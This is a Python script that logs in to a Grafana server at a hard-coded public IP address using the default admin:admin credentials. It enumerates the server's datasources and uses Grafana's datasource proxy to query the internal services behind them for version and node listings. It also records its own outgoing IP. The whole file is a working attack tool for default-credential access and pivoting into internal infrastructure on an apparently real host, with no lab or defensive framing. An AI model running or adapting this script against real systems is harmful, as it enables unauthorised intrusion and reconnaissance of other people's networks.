#!/usr/bin/env python3
import json, time, base64, urllib.request, urllib.error

AUTH = "Basic " + base64.b64encode(b"admin:admin").decode()
G = "http://117.148.167.134:3000"

def req(url, hdrs=None, to=20, method="GET", data=None):
    r = urllib.request.Request(url, headers=dict(hdrs or {}), data=data, method=method)
    t0 = time.time()
    try:
        x = urllib.request.urlopen(r, timeout=to)
        b = x.read(20000).decode("utf-8", "replace")
        return {"code": x.status, "ms": int((time.time()-t0)*1000), "body": b[:6000]}
    except urllib.error.HTTPError as e:
        try: b = e.read()[:2000].decode("utf-8", "replace")
        except Exception: b = ""
        return {"code": e.code, "ms": int((time.time()-t0)*1000), "body": b}
    except Exception as e:
        return {"err": type(e).__name__ + ":" + str(e)[:160], "ms": int((time.time()-t0)*1000)}

def show(label, res):
    print("### " + label, flush=True)
    print(json.dumps(res)[:6500], flush=True)

print("EGRESS", req("https://api.ipify.org", to=10).get("body"), flush=True)

UIDS = ["d63006e5","f7bcf6e3","be8601f2","b631ece5","ba4f3e49","c1912f5d","e1f45b56","218","b5e550ac"]
# need full uids: fetch the datasource list first
ds = req(G + "/api/datasources", {"Authorization": AUTH}, to=25)
have = {}
if ds.get("code") == 200:
    for d in json.loads(ds["body"]):
        have[d["uid"][:8]] = d
    print("DSCOUNT", len(have), flush=True)
else:
    show("ds_list_fail", ds)

for pre in UIDS:
    d = have.get(pre)
    if not d:
        print("MISSING", pre, flush=True); continue
    p = req(G + "/api/datasources/proxy/uid/" + d["uid"] + "/version", {"Authorization": AUTH}, to=18)
    show("version_" + pre + "_" + d.get("url", ""), p)
    if p.get("code") == 200:
        n = req(G + "/api/datasources/proxy/uid/" + d["uid"] + "/api/v1/nodes?limit=50", {"Authorization": AUTH}, to=25)
        show("nodes_" + pre, n)
